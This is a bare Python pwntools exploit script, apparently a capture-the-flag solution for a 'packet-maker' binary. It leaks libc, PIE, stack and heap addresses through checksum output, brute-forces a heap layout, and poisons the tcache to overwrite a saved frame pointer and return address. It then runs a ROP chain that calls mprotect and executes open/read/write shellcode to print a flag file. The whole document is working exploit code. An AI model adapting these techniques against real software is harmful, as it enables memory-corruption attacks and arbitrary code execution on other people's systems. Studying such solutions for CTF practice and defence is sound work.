from pwn import *
choice = lambda x: p.sendlineafter(b"> ", str(x).encode())
def addProtocol(name):
    choice(1)
    p.sendafter(b"> ", name)

def addPacket(size, index, packet):
    choice(2)
    choice(size)
    choice(index)
    p.sendafter(b"> ", packet)

def delPacket(index):
    choice(3)
    choice(index)

def calcChecksum():
    p.recvuntil(b": ")

    checksum = ((~int(p.recvline(), 16) + 1) & 0xFFFFFFFF)
    # print(f"cur checksum : {hex(checksum)}")
    s = u32(b'DNS:') + sz
    for i in range(0, len(pl), 4):
        s += u32(pl[i:i+4].ljust(4, b'\x00'))
        # print(f"checksum : {hex(s)}")
        if s > 0x100000000:
            s -= 0xFFFFFFFF

    result = checksum - s
    if result < 0:
        result += 0x100000000 - 1

    # print(f"result : {hex(result)}")
    return result

def leak_8(offset=4):
    global sz, pl
    addPacket(sz, 2, pl)
    low = calcChecksum()
    if low == 0:
        return -1
    delPacket(0)

    sz += offset
    pl += b'\x01'* offset
    addPacket(sz, 2, pl)
    high = calcChecksum()
    delPacket(0)
    
    val = (high << 32) + low
    return val

context(arch='amd64')
# context.log_level = 'debug'

while True:
    if args.REMOTE:
        p = remote('localhost', 32769)
        libc = ELF('./libc.so.6', False)
    else:
        p = process('./packet-maker', aslr=1)
        libc = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6', False)

    # 1. leak libc, pie, stack (uninitialized stack)
    pl = b'\x80'*0x1
    sz = len(pl) + 4 + 4    # 4(protocol length) + 4(3bytes to leak)
    libc.address = leak_8(3) + 0x80 - libc.sym._IO_2_1_stdout_

    pl = b'\x01'*0x10
    sz = len(pl) + 4 + 5    # 4(protocol length) + 5(4bytes to leak)
    pie = leak_8() - 0x4020

    pl = b'\x01' * 0x40
    sz = len(pl) + 4 + 5    # 4(protocol length) + 5(4bytes to leak)
    stack = leak_8()
    if stack == -1:
        log.failure("stack leak failed")
        p.close()
        continue

    # 2. leak heap (using packet->prev and pie)
    addPacket(0x1, 1, b'\x00')
    addPacket(0x1, 1, b'\x00')
    p.recvuntil(b"checksum : ")
    checksum = ((~int(p.recvline(), 16) + 1) & 0xFFFFFFFF)
    heap = (checksum - (pie >> 32) - 1 - 0x300) | (pie & 0xFFFF00000000)
    if heap & 1 == 1:
        heap -= 1

    if heap & 0xFFF != 0:
        log.failure("heap leak failed")
        p.close()
        continue 
    
    # check heap address for exploit
    A = (heap >> 24) & 0xF
    B = (heap >> 20) & 0xF
    D = (heap >> 12) & 0xF
    if B != 0:
        log.failure("heap bruteforce failed")
        p.close()
        continue

    elif A == D:
        log.failure("heap bruteforce failed")
        p.close()
        continue

    log.success(f"pie base @ 0x{pie:x}")
    log.success(f"heap @ 0x{heap:x}")
    log.success(f"libc base @ 0x{libc.address:x}")
    log.success(f"stack @ 0x{stack:x}")
    
    # 3. allocate the chunks until A be equal with D
    top = heap + 0x380
    cnt = 1
    while A != D:
        addPacket(1, 1, b'\x00')
        cnt += 1
        top += 0x90
        D = (top >> 12) & 0xF
    
    # if B is set, try again
    target_chunk = top
    B = (top >> 20) & 0xF
    while ((target_chunk >> 8) & 0xF) != B:
        p.close()
        continue

    # 4. set target chunk which will prepare tcache->next as tcache_perthread_struct
    target_chunk = top
    target_chunk_data = (target_chunk + 0x20) & 0xFF
    target_chunk_cnt = cnt
    log.info(f"target chunk @ 0x{target_chunk:x}")

    # 5. allocate more chunks and find the safe place for tcache->next
    addPacket(0x68, 1, b'A'*8)
    addPacket(0x68, 1, b'A'*8)
    addPacket(0x68, 1, b'A'*8)
    top += 0x90 * 3
    cnt += 3
    log.info(f"top : 0x{top:x}")

    while True:
        top_data_fd = (top & 0xFF)
        if target_chunk_data <= top_data_fd and top_data_fd < target_chunk_data + 0x68:
            break

        top += 0x90
        cnt += 1
        addPacket(1, 1, b'1')
    
    offset = top_data_fd - target_chunk_data
    
    # 6. free target_chunk and prepare tcache->next
    delPacket(target_chunk_cnt)
    addPacket(0x68, 2, b'A'*(offset - 4) + p64((heap + 0x10) ^ (top >> 12)))
    
    # 7. overwrite tcache->next as target_chunk->data (oob write NULL)
    delPacket(0)
    delPacket(cnt - 2)
    delPacket(cnt - 3)
    delPacket(cnt - 4)
    addProtocol(b'A'*0xF)
    addPacket(0x68, 4, b'B'*0x61 + b'\x00')
    addPacket(1, 1, b'\x00')
    addPacket(1, 1, b'\x00')

    try:
        # 8. overwrite gets on main SFP
        addPacket(0x68, 4, b'B'*0x50 + p64(stack + 0x20)[:7])
        addProtocol(p64(libc.symbols['gets'])[:7])

        # 9. free tcache_perthread_struct chunk into unsorted bin (entry cnt is larger than 7)
        delPacket(cnt - 3)

        # 10. overwrite rdi, rbp gadget on addProtocol RET
        rop = ROP([libc])
        pop_rdi_rbp = rop.find_gadget(['pop rdi', 'pop rbp', 'ret'])[0]
        addPacket(0x68, 4, b'C'*0x50 + p64(stack)[:7])
        addProtocol(b'B'* 8 + p64(pop_rdi_rbp)[:7])
    except EOFError:
        p.close()
        continue

    if args.REMOTE:
        shell = shellcraft.open("/flag.txt")
    else:
        shell = shellcraft.open("./flag.txt")
    shell += shellcraft.read("rax", heap, 0x50)
    shell += shellcraft.write(1, heap, 0x50)

    # 11. write rop payload and shellcode for ORW
    rop.call("mprotect", [stack - (stack & 0xFFF), 0x2000, 7])
    payload = b'F' * 0x18
    payload += rop.chain()
    payload += p64(stack + 0x70) + asm(shell)
    p.sendline(payload)
    print(p.recvuntil(b"}"))

    break

p.close()
exit(0)
